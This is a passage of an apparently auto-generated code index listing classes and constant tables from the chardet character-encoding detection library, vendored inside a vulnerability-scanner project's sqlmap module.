        "peekOfCode": "class EUCKRDistributionAnalysis(CharDistributionAnalysis):\n    def __init__(self):\n        super(EUCKRDistributionAnalysis, self).__init__()\n        self._char_to_freq_order = EUCKR_CHAR_TO_FREQ_ORDER\n        self._table_size = EUCKR_TABLE_SIZE\n        self.typical_distribution_ratio = EUCKR_TYPICAL_DISTRIBUTION_RATIO\n    def get_order(self, byte_str):\n        # for euc-KR encoding, we are interested\n        #   first  byte range: 0xb0 -- 0xfe\n        #   second byte range: 0xa1 -- 0xfe",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "documentation": {}
    },
    {
        "label": "GB2312DistributionAnalysis",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "peekOfCode": "class GB2312DistributionAnalysis(CharDistributionAnalysis):\n    def __init__(self):\n        super(GB2312DistributionAnalysis, self).__init__()\n        self._char_to_freq_order = GB2312_CHAR_TO_FREQ_ORDER\n        self._table_size = GB2312_TABLE_SIZE\n        self.typical_distribution_ratio = GB2312_TYPICAL_DISTRIBUTION_RATIO\n    def get_order(self, byte_str):\n        # for GB2312 encoding, we are interested\n        #  first  byte range: 0xb0 -- 0xfe\n        #  second byte range: 0xa1 -- 0xfe",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "documentation": {}
    },
    {
        "label": "Big5DistributionAnalysis",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "peekOfCode": "class Big5DistributionAnalysis(CharDistributionAnalysis):\n    def __init__(self):\n        super(Big5DistributionAnalysis, self).__init__()\n        self._char_to_freq_order = BIG5_CHAR_TO_FREQ_ORDER\n        self._table_size = BIG5_TABLE_SIZE\n        self.typical_distribution_ratio = BIG5_TYPICAL_DISTRIBUTION_RATIO\n    def get_order(self, byte_str):\n        # for big5 encoding, we are interested\n        #   first  byte range: 0xa4 -- 0xfe\n        #   second byte range: 0x40 -- 0x7e , 0xa1 -- 0xfe",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "documentation": {}
    },
    {
        "label": "SJISDistributionAnalysis",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "peekOfCode": "class SJISDistributionAnalysis(CharDistributionAnalysis):\n    def __init__(self):\n        super(SJISDistributionAnalysis, self).__init__()\n        self._char_to_freq_order = JIS_CHAR_TO_FREQ_ORDER\n        self._table_size = JIS_TABLE_SIZE\n        self.typical_distribution_ratio = JIS_TYPICAL_DISTRIBUTION_RATIO\n    def get_order(self, byte_str):\n        # for sjis encoding, we are interested\n        #   first  byte range: 0x81 -- 0x9f , 0xe0 -- 0xfe\n        #   second byte range: 0x40 -- 0x7e,  0x81 -- oxfe",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "documentation": {}
    },
    {
        "label": "EUCJPDistributionAnalysis",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "peekOfCode": "class EUCJPDistributionAnalysis(CharDistributionAnalysis):\n    def __init__(self):\n        super(EUCJPDistributionAnalysis, self).__init__()\n        self._char_to_freq_order = JIS_CHAR_TO_FREQ_ORDER\n        self._table_size = JIS_TABLE_SIZE\n        self.typical_distribution_ratio = JIS_TYPICAL_DISTRIBUTION_RATIO\n    def get_order(self, byte_str):\n        # for euc-JP encoding, we are interested\n        #   first  byte range: 0xa0 -- 0xfe\n        #   second byte range: 0xa1 -- 0xfe",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.chardistribution",
        "documentation": {}
    },
    {
        "label": "CharSetGroupProber",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.charsetgroupprober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.charsetgroupprober",
        "peekOfCode": "class CharSetGroupProber(CharSetProber):\n    def __init__(self, lang_filter=None):\n        super(CharSetGroupProber, self).__init__(lang_filter=lang_filter)\n        self._active_num = 0\n        self.probers = []\n        self._best_guess_prober = None\n    def reset(self):\n        super(CharSetGroupProber, self).reset()\n        self._active_num = 0\n        for prober in self.probers:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.charsetgroupprober",
        "documentation": {}
    },
    {
        "label": "CharSetProber",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.charsetprober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.charsetprober",
        "peekOfCode": "class CharSetProber(object):\n    SHORTCUT_THRESHOLD = 0.95\n    def __init__(self, lang_filter=None):\n        self._state = None\n        self.lang_filter = lang_filter\n        self.logger = logging.getLogger(__name__)\n    def reset(self):\n        self._state = ProbingState.DETECTING\n    @property\n    def charset_name(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.charsetprober",
        "documentation": {}
    },
    {
        "label": "CodingStateMachine",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.codingstatemachine",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.codingstatemachine",
        "peekOfCode": "class CodingStateMachine(object):\n    \"\"\"\n    A state machine to verify a byte sequence for a particular encoding. For\n    each byte the detector receives, it will feed that byte to every active\n    state machine available, one byte at a time. The state machine changes its\n    state based on its previous state and the byte it receives. There are 3\n    states in a state machine that are of interest to an auto-detector:\n    START state: This is the state to start with, or a legal byte sequence\n                 (i.e. a valid code point) for character has been identified.\n    ME state:  This indicates that the state machine identified a byte sequence",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.codingstatemachine",
        "documentation": {}
    },
    {
        "label": "CP949Prober",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.cp949prober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.cp949prober",
        "peekOfCode": "class CP949Prober(MultiByteCharSetProber):\n    def __init__(self):\n        super(CP949Prober, self).__init__()\n        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)\n        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be\n        #       not different.\n        self.distribution_analyzer = EUCKRDistributionAnalysis()\n        self.reset()\n    @property\n    def charset_name(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.cp949prober",
        "documentation": {}
    },
    {
        "label": "InputState",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "peekOfCode": "class InputState(object):\n    \"\"\"\n    This enum represents the different states a universal detector can be in.\n    \"\"\"\n    PURE_ASCII = 0\n    ESC_ASCII = 1\n    HIGH_BYTE = 2\nclass LanguageFilter(object):\n    \"\"\"\n    This enum represents the different language filters we can apply to a",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "documentation": {}
    },
    {
        "label": "LanguageFilter",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "peekOfCode": "class LanguageFilter(object):\n    \"\"\"\n    This enum represents the different language filters we can apply to a\n    ``UniversalDetector``.\n    \"\"\"\n    CHINESE_SIMPLIFIED = 0x01\n    CHINESE_TRADITIONAL = 0x02\n    JAPANESE = 0x04\n    KOREAN = 0x08\n    NON_CJK = 0x10",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "documentation": {}
    },
    {
        "label": "ProbingState",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "peekOfCode": "class ProbingState(object):\n    \"\"\"\n    This enum represents the different states a prober can be in.\n    \"\"\"\n    DETECTING = 0\n    FOUND_IT = 1\n    NOT_ME = 2\nclass MachineState(object):\n    \"\"\"\n    This enum represents the different states a state machine can be in.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "documentation": {}
    },
    {
        "label": "MachineState",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "peekOfCode": "class MachineState(object):\n    \"\"\"\n    This enum represents the different states a state machine can be in.\n    \"\"\"\n    START = 0\n    ERROR = 1\n    ITS_ME = 2\nclass SequenceLikelihood(object):\n    \"\"\"\n    This enum represents the likelihood of a character following the previous one.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "documentation": {}
    },
    {
        "label": "SequenceLikelihood",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "peekOfCode": "class SequenceLikelihood(object):\n    \"\"\"\n    This enum represents the likelihood of a character following the previous one.\n    \"\"\"\n    NEGATIVE = 0\n    UNLIKELY = 1\n    LIKELY = 2\n    POSITIVE = 3\n    @classmethod\n    def get_num_categories(cls):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "documentation": {}
    },
    {
        "label": "CharacterCategory",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "peekOfCode": "class CharacterCategory(object):\n    \"\"\"\n    This enum represents the different categories language models for\n    ``SingleByteCharsetProber`` put characters into.\n    Anything less than CONTROL is considered a letter.\n    \"\"\"\n    UNDEFINED = 255\n    LINE_BREAK = 254\n    SYMBOL = 253\n    DIGIT = 252",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.enums",
        "documentation": {}
    },
    {
        "label": "EscCharSetProber",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escprober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escprober",
        "peekOfCode": "class EscCharSetProber(CharSetProber):\n    \"\"\"\n    This CharSetProber uses a \"code scheme\" approach for detecting encodings,\n    whereby easily recognizable escape or shift sequences are relied on to\n    identify these encodings.\n    \"\"\"\n    def __init__(self, lang_filter=None):\n        super(EscCharSetProber, self).__init__(lang_filter=lang_filter)\n        self.coding_sm = []\n        if self.lang_filter & LanguageFilter.CHINESE_SIMPLIFIED:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escprober",
        "documentation": {}
    },
    {
        "label": "HZ_CLS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "HZ_CLS = (\n1,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,0,0,  # 08 - 0f\n0,0,0,0,0,0,0,0,  # 10 - 17\n0,0,0,1,0,0,0,0,  # 18 - 1f\n0,0,0,0,0,0,0,0,  # 20 - 27\n0,0,0,0,0,0,0,0,  # 28 - 2f\n0,0,0,0,0,0,0,0,  # 30 - 37\n0,0,0,0,0,0,0,0,  # 38 - 3f\n0,0,0,0,0,0,0,0,  # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "HZ_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "HZ_ST = (\nMachineState.START,MachineState.ERROR,     3,MachineState.START,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,# 00-07\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,# 08-0f\nMachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.START,MachineState.START,     4,MachineState.ERROR,# 10-17\n     5,MachineState.ERROR,     6,MachineState.ERROR,     5,     5,     4,MachineState.ERROR,# 18-1f\n     4,MachineState.ERROR,     4,     4,     4,MachineState.ERROR,     4,MachineState.ERROR,# 20-27\n     4,MachineState.ITS_ME,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,# 28-2f\n)\nHZ_CHAR_LEN_TABLE = (0, 0, 0, 0, 0, 0)\nHZ_SM_MODEL = {'class_table': HZ_CLS,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "HZ_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "HZ_CHAR_LEN_TABLE = (0, 0, 0, 0, 0, 0)\nHZ_SM_MODEL = {'class_table': HZ_CLS,\n               'class_factor': 6,\n               'state_table': HZ_ST,\n               'char_len_table': HZ_CHAR_LEN_TABLE,\n               'name': \"HZ-GB-2312\",\n               'language': 'Chinese'}\nISO2022CN_CLS = (\n2,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,0,0,  # 08 - 0f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "HZ_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "HZ_SM_MODEL = {'class_table': HZ_CLS,\n               'class_factor': 6,\n               'state_table': HZ_ST,\n               'char_len_table': HZ_CHAR_LEN_TABLE,\n               'name': \"HZ-GB-2312\",\n               'language': 'Chinese'}\nISO2022CN_CLS = (\n2,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,0,0,  # 08 - 0f\n0,0,0,0,0,0,0,0,  # 10 - 17",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "ISO2022CN_CLS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "ISO2022CN_CLS = (\n2,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,0,0,  # 08 - 0f\n0,0,0,0,0,0,0,0,  # 10 - 17\n0,0,0,1,0,0,0,0,  # 18 - 1f\n0,0,0,0,0,0,0,0,  # 20 - 27\n0,3,0,0,0,0,0,0,  # 28 - 2f\n0,0,0,0,0,0,0,0,  # 30 - 37\n0,0,0,0,0,0,0,0,  # 38 - 3f\n0,0,0,4,0,0,0,0,  # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "ISO2022CN_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "ISO2022CN_ST = (\nMachineState.START,     3,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,# 00-07\nMachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 08-0f\nMachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,# 10-17\nMachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     4,MachineState.ERROR,# 18-1f\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 20-27\n     5,     6,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 28-2f\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 30-37\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,MachineState.START,# 38-3f\n)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "ISO2022CN_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "ISO2022CN_CHAR_LEN_TABLE = (0, 0, 0, 0, 0, 0, 0, 0, 0)\nISO2022CN_SM_MODEL = {'class_table': ISO2022CN_CLS,\n                      'class_factor': 9,\n                      'state_table': ISO2022CN_ST,\n                      'char_len_table': ISO2022CN_CHAR_LEN_TABLE,\n                      'name': \"ISO-2022-CN\",\n                      'language': 'Chinese'}\nISO2022JP_CLS = (\n2,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,2,2,  # 08 - 0f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "ISO2022CN_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "ISO2022CN_SM_MODEL = {'class_table': ISO2022CN_CLS,\n                      'class_factor': 9,\n                      'state_table': ISO2022CN_ST,\n                      'char_len_table': ISO2022CN_CHAR_LEN_TABLE,\n                      'name': \"ISO-2022-CN\",\n                      'language': 'Chinese'}\nISO2022JP_CLS = (\n2,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,2,2,  # 08 - 0f\n0,0,0,0,0,0,0,0,  # 10 - 17",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "ISO2022JP_CLS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "ISO2022JP_CLS = (\n2,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,2,2,  # 08 - 0f\n0,0,0,0,0,0,0,0,  # 10 - 17\n0,0,0,1,0,0,0,0,  # 18 - 1f\n0,0,0,0,7,0,0,0,  # 20 - 27\n3,0,0,0,0,0,0,0,  # 28 - 2f\n0,0,0,0,0,0,0,0,  # 30 - 37\n0,0,0,0,0,0,0,0,  # 38 - 3f\n6,0,4,0,8,0,0,0,  # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "ISO2022JP_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "ISO2022JP_ST = (\nMachineState.START,     3,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.START,MachineState.START,# 00-07\nMachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 08-0f\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,# 10-17\nMachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,# 18-1f\nMachineState.ERROR,     5,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     4,MachineState.ERROR,MachineState.ERROR,# 20-27\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     6,MachineState.ITS_ME,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,# 28-2f\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,# 30-37\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 38-3f\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ERROR,MachineState.START,MachineState.START,# 40-47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "ISO2022JP_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "ISO2022JP_CHAR_LEN_TABLE = (0, 0, 0, 0, 0, 0, 0, 0, 0, 0)\nISO2022JP_SM_MODEL = {'class_table': ISO2022JP_CLS,\n                      'class_factor': 10,\n                      'state_table': ISO2022JP_ST,\n                      'char_len_table': ISO2022JP_CHAR_LEN_TABLE,\n                      'name': \"ISO-2022-JP\",\n                      'language': 'Japanese'}\nISO2022KR_CLS = (\n2,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,0,0,  # 08 - 0f",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "ISO2022JP_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "ISO2022JP_SM_MODEL = {'class_table': ISO2022JP_CLS,\n                      'class_factor': 10,\n                      'state_table': ISO2022JP_ST,\n                      'char_len_table': ISO2022JP_CHAR_LEN_TABLE,\n                      'name': \"ISO-2022-JP\",\n                      'language': 'Japanese'}\nISO2022KR_CLS = (\n2,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,0,0,  # 08 - 0f\n0,0,0,0,0,0,0,0,  # 10 - 17",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "ISO2022KR_CLS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "ISO2022KR_CLS = (\n2,0,0,0,0,0,0,0,  # 00 - 07\n0,0,0,0,0,0,0,0,  # 08 - 0f\n0,0,0,0,0,0,0,0,  # 10 - 17\n0,0,0,1,0,0,0,0,  # 18 - 1f\n0,0,0,0,3,0,0,0,  # 20 - 27\n0,4,0,0,0,0,0,0,  # 28 - 2f\n0,0,0,0,0,0,0,0,  # 30 - 37\n0,0,0,0,0,0,0,0,  # 38 - 3f\n0,0,0,5,0,0,0,0,  # 40 - 47",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "ISO2022KR_ST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "ISO2022KR_ST = (\nMachineState.START,     3,MachineState.ERROR,MachineState.START,MachineState.START,MachineState.START,MachineState.ERROR,MachineState.ERROR,# 00-07\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,MachineState.ITS_ME,# 08-0f\nMachineState.ITS_ME,MachineState.ITS_ME,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     4,MachineState.ERROR,MachineState.ERROR,# 10-17\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,     5,MachineState.ERROR,MachineState.ERROR,MachineState.ERROR,# 18-1f\nMachineState.ERROR,MachineState.ERROR,MachineState.ERROR,MachineState.ITS_ME,MachineState.START,MachineState.START,MachineState.START,MachineState.START,# 20-27\n)\nISO2022KR_CHAR_LEN_TABLE = (0, 0, 0, 0, 0, 0)\nISO2022KR_SM_MODEL = {'class_table': ISO2022KR_CLS,\n                      'class_factor': 6,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "ISO2022KR_CHAR_LEN_TABLE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "ISO2022KR_CHAR_LEN_TABLE = (0, 0, 0, 0, 0, 0)\nISO2022KR_SM_MODEL = {'class_table': ISO2022KR_CLS,\n                      'class_factor': 6,\n                      'state_table': ISO2022KR_ST,\n                      'char_len_table': ISO2022KR_CHAR_LEN_TABLE,\n                      'name': \"ISO-2022-KR\",\n                      'language': 'Korean'}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "ISO2022KR_SM_MODEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "peekOfCode": "ISO2022KR_SM_MODEL = {'class_table': ISO2022KR_CLS,\n                      'class_factor': 6,\n                      'state_table': ISO2022KR_ST,\n                      'char_len_table': ISO2022KR_CHAR_LEN_TABLE,\n                      'name': \"ISO-2022-KR\",\n                      'language': 'Korean'}",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.escsm",
        "documentation": {}
    },
    {
        "label": "EUCJPProber",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.eucjpprober",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.eucjpprober",
        "peekOfCode": "class EUCJPProber(MultiByteCharSetProber):\n    def __init__(self):\n        super(EUCJPProber, self).__init__()\n        self.coding_sm = CodingStateMachine(EUCJP_SM_MODEL)\n        self.distribution_analyzer = EUCJPDistributionAnalysis()\n        self.context_analyzer = EUCJPContextAnalysis()\n        self.reset()\n    def reset(self):\n        super(EUCJPProber, self).reset()\n        self.context_analyzer.reset()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.eucjpprober",
        "documentation": {}
    },
    {
        "label": "EUCKR_TYPICAL_DISTRIBUTION_RATIO",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.euckrfreq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.euckrfreq",
        "peekOfCode": "EUCKR_TYPICAL_DISTRIBUTION_RATIO = 6.0\nEUCKR_TABLE_SIZE = 2352\n# Char to FreqOrder table ,\nEUCKR_CHAR_TO_FREQ_ORDER = (\n  13, 130, 120,1396, 481,1719,1720, 328, 609, 212,1721, 707, 400, 299,1722,  87,\n1397,1723, 104, 536,1117,1203,1724,1267, 685,1268, 508,1725,1726,1727,1728,1398,\n1399,1729,1730,1731, 141, 621, 326,1057, 368,1732, 267, 488,  20,1733,1269,1734,\n 945,1400,1735,  47, 904,1270,1736,1737, 773, 248,1738, 409, 313, 786, 429,1739,\n 116, 987, 813,1401, 683,  75,1204, 145,1740,1741,1742,1743,  16, 847, 667, 622,\n 708,1744,1745,1746, 966, 787, 304, 129,1747,  60, 820, 123, 676,1748,1749,1750,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.euckrfreq",
        "documentation": {}
    },
    {
        "label": "EUCKR_TABLE_SIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.euckrfreq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.euckrfreq",
        "peekOfCode": "EUCKR_TABLE_SIZE = 2352\n# Char to FreqOrder table ,\nEUCKR_CHAR_TO_FREQ_ORDER = (\n  13, 130, 120,1396, 481,1719,1720, 328, 609, 212,1721, 707, 400, 299,1722,  87,\n1397,1723, 104, 536,1117,1203,1724,1267, 685,1268, 508,1725,1726,1727,1728,1398,\n1399,1729,1730,1731, 141, 621, 326,1057, 368,1732, 267, 488,  20,1733,1269,1734,\n 945,1400,1735,  47, 904,1270,1736,1737, 773, 248,1738, 409, 313, 786, 429,1739,\n 116, 987, 813,1401, 683,  75,1204, 145,1740,1741,1742,1743,  16, 847, 667, 622,\n 708,1744,1745,1746, 966, 787, 304, 129,1747,  60, 820, 123, 676,1748,1749,1750,\n1751, 617,1752, 626,1753,1754,1755,1756, 653,1757,1758,1759,1760,1761,1762, 856,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.chardet.euckrfreq",
        "documentation": {}
    },
    {
        "label": "EUCKR_CHAR_TO_FREQ_ORDER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.chardet.euckrfreq",
        "description": "VulnScan.modules.sqlmap.thirdparty.chardet.euckrfreq",
